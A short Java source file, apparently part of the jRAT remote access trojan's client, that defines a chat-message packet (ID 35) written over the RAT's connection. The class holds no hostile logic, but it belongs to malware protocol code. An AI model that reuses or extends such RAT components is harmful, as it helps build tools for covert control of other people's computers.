package jrat.client.packets.outgoing;

import jrat.client.Connection;


public class Packet35ChatMessage extends AbstractOutgoingPacket {

	private String message;

	public Packet35ChatMessage(String message) {
		this.message = message;
	}

	@Override
	public void write(Connection con) throws Exception {
		con.writeLine(this.message);
	}

	@Override
	public short getPacketId() {
		return 35;
	}

}
